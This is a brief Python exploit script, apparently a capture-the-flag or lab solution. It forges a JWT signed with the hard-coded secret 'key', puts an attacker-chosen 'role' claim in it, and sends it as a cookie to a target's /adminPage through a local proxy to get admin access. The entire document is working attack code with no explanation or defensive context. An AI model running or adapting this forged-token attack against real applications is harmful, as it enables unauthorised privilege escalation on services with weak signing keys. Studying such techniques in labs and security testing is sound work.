#!/usr/bin/python3
# Author: Hack.You
import requests
import json
import base64
import sys
import hmac
import hashlib

username = sys.argv[2]

sign_key = 'key'

header = json.dumps({
    "alg":"HS256",
    "typ":"JWT"
}).encode()

payload = json.dumps({
    "role": username,
}).encode()

header_ = base64.urlsafe_b64encode(header).decode().rstrip('=')
payload_ = base64.urlsafe_b64encode(payload).decode().rstrip('=')

# sign a new signature (hmac needs key,msg & digestmod)
signature = hmac.new(
    key=sign_key.encode(),
    msg=f'{header_}.{payload_}'.encode(),
    digestmod = hashlib.sha256
).digest()

# jwt token header.payload.signature
sign = f'{header_}.{payload_}.{base64.urlsafe_b64encode(signature).decode()}'

url = f'{sys.argv[1]}/adminPage'
proxy = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
    }
headers = {
    'Cookie': f'token={sign.rstrip("=")}'
}

req = requests.get(url, proxies=proxy, headers=headers)
print(req.text)
